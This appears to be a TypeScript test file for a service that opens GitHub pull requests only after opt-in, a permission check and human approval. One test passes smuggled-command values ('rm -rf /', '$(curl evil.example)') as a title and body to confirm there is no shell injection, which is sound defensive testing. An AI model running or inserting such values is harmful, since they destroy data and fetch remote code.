/**
 * PrCreationService tests (WS-B1 phase 1).
 *
 * All process spawns, git operations, permission checks, approvals, and
 * stores are injected — this suite never really pushes or calls `gh`.
 * The approval store and evidence store use a real in-memory SQLite DB
 * (matches the `evidence-store.spec.ts` / `durable-approval-store.spec.ts`
 * pattern) so persistence side effects are asserted for real, not mocked.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import Database from 'better-sqlite3';
import type { SqliteDriver } from '../db/sqlite-driver';
import { DurableApprovalStore } from '../orchestration/durable-approval-store';
import { EvidenceStore } from '../orchestration/evidence-store';
import type { PermissionDecision, PermissionRequest } from '../security/permission-manager';
import {
  PrCreationService,
  GhTimeoutError,
  extractPrUrl,
  resolvePrCreationOptIn,
  type PrCreationDeps,
  type GhCommandResult,
} from './pr-creation-service';

// ---- Test DB helpers ---------------------------------------------------------

function createApprovalDb(): SqliteDriver {
  return new Database(':memory:') as unknown as SqliteDriver;
}

function createEvidenceDb(): SqliteDriver {
  const db = new Database(':memory:') as unknown as SqliteDriver;
  db.exec(`
    CREATE TABLE IF NOT EXISTS evidence_records (
      id               TEXT PRIMARY KEY,
      loop_id          TEXT NOT NULL,
      target           TEXT NOT NULL,
      kind             TEXT NOT NULL,
      state            TEXT NOT NULL CHECK(state IN ('fixed', 'verified', 'reviewed')),
      timestamp        INTEGER NOT NULL,
      source_metadata  TEXT NOT NULL DEFAULT '{}',
      created_at       INTEGER NOT NULL
    );
  `);
  return db;
}

const NEVER_DELEGABLE_ASK: PermissionDecision = {
  request: {} as PermissionRequest,
  action: 'ask',
  category: 'external_publish',
  decidedBy: 'never-delegable-guard',
  fromCache: false,
  reason: 'never-delegable:external_publish',
  decidedAt: 0,
};

interface Harness {
  service: PrCreationService;
  deps: PrCreationDeps;
  approvalDb: SqliteDriver;
  evidenceDb: SqliteDriver;
  runGh: ReturnType<typeof vi.fn>;
  askApproval: ReturnType<typeof vi.fn>;
  checkPermission: ReturnType<typeof vi.fn>;
  branchExists: ReturnType<typeof vi.fn>;
  hasUpstream: ReturnType<typeof vi.fn>;
  gitPush: ReturnType<typeof vi.fn>;
}

function buildHarness(overrides: Partial<PrCreationDeps> = {}): Harness {
  const approvalDb = createApprovalDb();
  const evidenceDb = createEvidenceDb();
  DurableApprovalStore._resetForTesting();
  EvidenceStore._resetForTesting();
  const approvalStore = new DurableApprovalStore(approvalDb);
  const evidenceStore = new EvidenceStore(evidenceDb);

  const runGh = vi.fn<PrCreationDeps['runGh']>().mockResolvedValue({
    stdout: 'https://github.com/acme/widgets/pull/42\n',
    stderr: '',
    code: 0,
  } satisfies GhCommandResult);
  const askApproval = vi.fn<PrCreationDeps['askApproval']>().mockResolvedValue(true);
  const checkPermission = vi.fn<PrCreationDeps['checkPermission']>().mockReturnValue(NEVER_DELEGABLE_ASK);
  const branchExists = vi.fn<PrCreationDeps['branchExists']>().mockResolvedValue(true);
  const hasUpstream = vi.fn<PrCreationDeps['hasUpstream']>().mockResolvedValue(true);
  const gitPush = vi.fn<PrCreationDeps['gitPush']>().mockResolvedValue(undefined);

  const deps: PrCreationDeps = {
    getAllowPrCreationMap: () => ({ '/repo': true }),
    checkPermission,
    askApproval,
    runGh,
    branchExists,
    hasUpstream,
    gitPush,
    getApprovalStore: () => approvalStore,
    getEvidenceStore: () => evidenceStore,
    now: () => 1_000,
    ...overrides,
  };

  return {
    service: new PrCreationService(deps),
    deps,
    approvalDb,
    evidenceDb,
    runGh,
    askApproval,
    checkPermission,
    branchExists,
    hasUpstream,
    gitPush,
  };
}

const BASE_OPTIONS = {
  projectPath: '/repo',
  branch: 'aio/session-branch',
  title: 'Add feature X',
};

describe('PrCreationService', () => {
  beforeEach(() => {
    DurableApprovalStore._resetForTesting();
    EvidenceStore._resetForTesting();
  });

  // ---- Gate 1: opt-in ---------------------------------------------------

  it('refuses with a typed optIn error when the project has not opted in, with no side effects', async () => {
    const h = buildHarness({ getAllowPrCreationMap: () => ({}) });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: false, error: { kind: 'optIn', message: expect.any(String) } });
    expect(h.checkPermission).not.toHaveBeenCalled();
    expect(h.askApproval).not.toHaveBeenCalled();
    expect(h.runGh).not.toHaveBeenCalled();
    expect(h.gitPush).not.toHaveBeenCalled();
  });

  it('treats opt-in as false when explicitly false in the map', async () => {
    const h = buildHarness({ getAllowPrCreationMap: () => ({ '/repo': false }) });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.kind).toBe('optIn');
    expect(h.runGh).not.toHaveBeenCalled();
  });

  // ---- Gate 2: never-delegable external_publish authority ---------------

  it('calls checkPermission with scope external_service + categoryHint external_publish', async () => {
    const h = buildHarness();
    await h.service.createPullRequest(BASE_OPTIONS);
    expect(h.checkPermission).toHaveBeenCalledTimes(1);
    const [request] = h.checkPermission.mock.calls[0] as [PermissionRequest];
    expect(request.scope).toBe('external_service');
    expect(request.context?.categoryHint).toBe('external_publish');
    expect(request.context?.workingDirectory).toBe('/repo');
  });

  // 2026-07-31 fresh-eyes WARNING 1 fix: decision.action must be enforced,
  // not just logged.
  it('refuses immediately on a "deny" decision, WITHOUT ever asking the user', async () => {
    const denyDecision: PermissionDecision = {
      request: {} as PermissionRequest,
      action: 'deny',
      category: 'external_publish',
      decidedBy: 'rule',
      fromCache: false,
      reason: 'denied by a matching rule',
      decidedAt: 0,
    };
    const h = buildHarness({ checkPermission: vi.fn().mockReturnValue(denyDecision) });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({
      ok: false,
      error: { kind: 'permissionDenied', message: 'denied by a matching rule' },
    });
    expect(h.askApproval).not.toHaveBeenCalled();
    expect(h.runGh).not.toHaveBeenCalled();
    expect(h.gitPush).not.toHaveBeenCalled();
  });

  it('fails safe (still asks) on an "allow" decision — an invariant violation for a never-delegable category', async () => {
    const wronglyAllowedDecision: PermissionDecision = {
      request: {} as PermissionRequest,
      action: 'allow',
      category: 'external_publish',
      decidedBy: 'yolo',
      fromCache: false,
      reason: 'YOLO mode enabled - all permissions granted',
      decidedAt: 0,
    };
    const h = buildHarness({ checkPermission: vi.fn().mockReturnValue(wronglyAllowedDecision) });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    // Still asks — never auto-approves just because checkPermission said 'allow'.
    expect(h.askApproval).toHaveBeenCalledTimes(1);
    expect(result.ok).toBe(true); // askApproval mock defaults to resolving true
  });

  it('denies and records the denial when the user does not approve, with no process spawn', async () => {
    const h = buildHarness({ askApproval: vi.fn().mockResolvedValue(false) });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: false, error: { kind: 'permissionDenied', message: expect.any(String) } });
    expect(h.runGh).not.toHaveBeenCalled();
    expect(h.gitPush).not.toHaveBeenCalled();

    const approvalStore = h.deps.getApprovalStore();
    const pending = approvalStore.listPending();
    expect(pending).toHaveLength(0); // resolved, not left pending
  });

  it('records a durable pr_create approval (created then resolved approved) on the approve path', async () => {
    const h = buildHarness();
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result.ok).toBe(true);

    // No pending approvals left; verify via direct row lookup using the same store instance.
    const approvalStore = h.deps.getApprovalStore();
    expect(approvalStore.listPending()).toHaveLength(0);
  });

  it('opt-in and permission-ask both precede any process spawn', async () => {
    const h = buildHarness();
    let ghCalledBeforeApproval = false;
    h.askApproval.mockImplementation(async () => {
      ghCalledBeforeApproval = h.runGh.mock.calls.length > 0;
      return true;
    });
    await h.service.createPullRequest(BASE_OPTIONS);
    expect(ghCalledBeforeApproval).toBe(false);
  });

  // ---- Execution pre-checks ------------------------------------------------

  it('returns authRequired when gh auth status exits non-zero, before touching git', async () => {
    const h = buildHarness({
      runGh: vi.fn().mockResolvedValue({ stdout: '', stderr: 'not logged in', code: 1 } satisfies GhCommandResult),
    });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: false, error: { kind: 'authRequired', message: expect.any(String) } });
    expect(h.branchExists).not.toHaveBeenCalled();
    expect(h.gitPush).not.toHaveBeenCalled();
  });

  it('returns gitState when the branch does not exist locally', async () => {
    const h = buildHarness({ branchExists: vi.fn().mockResolvedValue(false) });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({
      ok: false,
      error: { kind: 'gitState', message: expect.stringContaining('aio/session-branch') },
    });
    expect(h.gitPush).not.toHaveBeenCalled();
  });

  it('pushes when the branch has no upstream, and skips push when it already has one', async () => {
    const h1 = buildHarness({ hasUpstream: vi.fn().mockResolvedValue(false) });
    await h1.service.createPullRequest(BASE_OPTIONS);
    expect(h1.gitPush).toHaveBeenCalledWith('aio/session-branch', '/repo');

    const h2 = buildHarness({ hasUpstream: vi.fn().mockResolvedValue(true) });
    await h2.service.createPullRequest(BASE_OPTIONS);
    expect(h2.gitPush).not.toHaveBeenCalled();
  });

  it('surfaces a typed gitState failure when the push itself fails', async () => {
    const h = buildHarness({
      hasUpstream: vi.fn().mockResolvedValue(false),
      gitPush: vi.fn().mockRejectedValue(new Error('remote rejected')),
    });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({
      ok: false,
      error: { kind: 'gitState', message: expect.stringContaining('remote rejected') },
    });
    expect(h.runGh).toHaveBeenCalledTimes(1); // only the auth-status call, never pr create
  });

  // ---- gh pr create outcomes -----------------------------------------------

  it('builds gh pr create with array args carrying title/body unmodified (no shell injection)', async () => {
    const dangerousTitle = 'fix; rm -rf / #`whoami`';
    const dangerousBody = '$(curl evil.example) && echo pwned';
    const h = buildHarness();
    await h.service.createPullRequest({
      ...BASE_OPTIONS,
      title: dangerousTitle,
      body: dangerousBody,
      baseBranch: 'main',
      draft: true,
    });

    const prCreateCall = h.runGh.mock.calls.find(([args]) => (args as string[])[0] === 'pr');
    expect(prCreateCall).toBeDefined();
    const [args, cwd] = prCreateCall as [string[], string];
    expect(Array.isArray(args)).toBe(true);
    expect(args).toEqual([
      'pr', 'create',
      '--title', dangerousTitle,
      '--body', dangerousBody,
      '--head', 'aio/session-branch',
      '--base', 'main',
      '--draft',
    ]);
    expect(cwd).toBe('/repo');
  });

  it('returns ok:true with the parsed URL on success', async () => {
    const h = buildHarness();
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: true, url: 'https://github.com/acme/widgets/pull/42' });
  });

  it('classifies a non-zero gh pr create exit with auth-shaped stderr as authRequired', async () => {
    const h = buildHarness({
      runGh: vi.fn()
        .mockResolvedValueOnce({ stdout: '', stderr: '', code: 0 }) // gh auth status
        .mockResolvedValueOnce({ stdout: '', stderr: 'To get started with GitHub CLI, please run: gh auth login', code: 4 }),
    });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: false, error: { kind: 'authRequired', message: expect.any(String) } });
  });

  it('classifies a non-zero gh pr create exit with unrelated stderr as unknown', async () => {
    const h = buildHarness({
      runGh: vi.fn()
        .mockResolvedValueOnce({ stdout: '', stderr: '', code: 0 })
        .mockResolvedValueOnce({ stdout: '', stderr: 'a pull request for branch "x" into branch "main" already exists', code: 1 }),
    });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: false, error: { kind: 'unknown', message: expect.any(String) } });
  });

  it('classifies missing stdout URL as unknown', async () => {
    const h = buildHarness({
      runGh: vi.fn()
        .mockResolvedValueOnce({ stdout: '', stderr: '', code: 0 })
        .mockResolvedValueOnce({ stdout: 'not a url', stderr: '', code: 0 }),
    });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: false, error: { kind: 'unknown', message: expect.any(String) } });
  });

  it('classifies an ENOENT spawn error as ghMissing', async () => {
    const enoent = Object.assign(new Error('spawn gh ENOENT'), { code: 'ENOENT' });
    const h = buildHarness({ runGh: vi.fn().mockRejectedValue(enoent) });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: false, error: { kind: 'ghMissing', message: expect.any(String) } });
  });

  it('classifies a GhTimeoutError as timeout', async () => {
    const h = buildHarness({ runGh: vi.fn().mockRejectedValue(new GhTimeoutError('gh auth timed out after 10000ms')) });
    const result = await h.service.createPullRequest(BASE_OPTIONS);
    expect(result).toEqual({ ok: false, error: { kind: 'timeout', message: expect.stringContaining('timed out') } });
  });

  // ---- Evidence recording ---------------------------------------------------

  it('records loop evidence (kind pr-created, state fixed) only when loopId is supplied and creation succeeds', async () => {
    const h = buildHarness();
    await h.service.createPullRequest({ ...BASE_OPTIONS, loopId: 'loop-1', baseBranch: 'main' });

    const evidenceStore = h.deps.getEvidenceStore();
    const records = evidenceStore.listForLoop('loop-1');
    expect(records).toHaveLength(1);
    expect(records[0]).toMatchObject({
      loopId: 'loop-1',
      target: 'aio/session-branch',
      kind: 'pr-created',
      state: 'fixed',
    });
    expect(records[0].sourceMetadata).toMatchObject({
      url: 'https://github.com/acme/widgets/pull/42',
      branch: 'aio/session-branch',
      baseBranch: 'main',
    });
  });

  it('does not record evidence when loopId is absent', async () => {
    const h = buildHarness();
    await h.service.createPullRequest(BASE_OPTIONS);
    const evidenceStore = h.deps.getEvidenceStore();
    expect(evidenceStore.listForLoop('loop-1')).toHaveLength(0);
  });

  it('does not record evidence on a failed creation even with loopId set', async () => {
    const h = buildHarness({ branchExists: vi.fn().mockResolvedValue(false) });
    await h.service.createPullRequest({ ...BASE_OPTIONS, loopId: 'loop-2' });
    const evidenceStore = h.deps.getEvidenceStore();
    expect(evidenceStore.listForLoop('loop-2')).toHaveLength(0);
  });
});

// ---- Pure helper unit tests -----------------------------------------------

describe('resolvePrCreationOptIn', () => {
  it('returns true only for an exact canonicalized project-root match set to true', () => {
    expect(resolvePrCreationOptIn('/repo', { '/repo': true })).toBe(true);
    expect(resolvePrCreationOptIn('/repo', { '/repo': false })).toBe(false);
    expect(resolvePrCreationOptIn('/repo', {})).toBe(false);
    expect(resolvePrCreationOptIn('/other', { '/repo': true })).toBe(false);
  });

  it('canonicalizes trailing slashes to the same root', () => {
    expect(resolvePrCreationOptIn('/repo/', { '/repo': true })).toBe(true);
  });
});

// 2026-07-31 fresh-eyes WARNING 2 fix: real symlinks, real tmpdir.
describe('resolvePrCreationOptIn — symlink resolution', () => {
  const tmpDirs: string[] = [];

  afterEach(() => {
    for (const dir of tmpDirs.splice(0)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  function makeTmpDir(name: string): string {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), `${name}-`));
    tmpDirs.push(dir);
    return fs.realpathSync(dir);
  }

  it('a symlink alias of the OPTED-IN directory inherits its opt-in', () => {
    const approvedDir = makeTmpDir('pr-creation-approved');
    const aliasPath = path.join(os.tmpdir(), `pr-creation-alias-${Date.now()}`);
    fs.symlinkSync(approvedDir, aliasPath, 'dir');
    tmpDirs.push(aliasPath);

    try {
      expect(resolvePrCreationOptIn(aliasPath, { [approvedDir]: true })).toBe(true);
    } finally {
      fs.rmSync(aliasPath, { force: true });
    }
  });

  it('a symlink alias of a DIFFERENT, un-opted-in directory does not inherit approval', () => {
    const approvedDir = makeTmpDir('pr-creation-approved-2');
    const otherDir = makeTmpDir('pr-creation-unapproved');
    const aliasToOther = path.join(os.tmpdir(), `pr-creation-alias-other-${Date.now()}`);
    fs.symlinkSync(otherDir, aliasToOther, 'dir');
    tmpDirs.push(aliasToOther);

    try {
      expect(resolvePrCreationOptIn(aliasToOther, { [approvedDir]: true })).toBe(false);
    } finally {
      fs.rmSync(aliasToOther, { force: true });
    }
  });

  it('fails closed for a nonexistent path (falls back to the plain-resolved form, matches nothing real)', () => {
    const approvedDir = makeTmpDir('pr-creation-approved-3');
    const missing = path.join(os.tmpdir(), `pr-creation-missing-${Date.now()}`);
    expect(resolvePrCreationOptIn(missing, { [approvedDir]: true })).toBe(false);
  });
});

describe('extractPrUrl', () => {
  it('extracts a bare URL', () => {
    expect(extractPrUrl('https://github.com/acme/widgets/pull/42\n')).toBe(
      'https://github.com/acme/widgets/pull/42',
    );
  });

  it('takes the last non-empty line when gh prints extra output first', () => {
    const stdout = 'Warning: something\n\nhttps://github.com/acme/widgets/pull/7\n';
    expect(extractPrUrl(stdout)).toBe('https://github.com/acme/widgets/pull/7');
  });

  it('returns undefined when there is no https URL', () => {
    expect(extractPrUrl('no url here')).toBeUndefined();
    expect(extractPrUrl('')).toBeUndefined();
  });
});
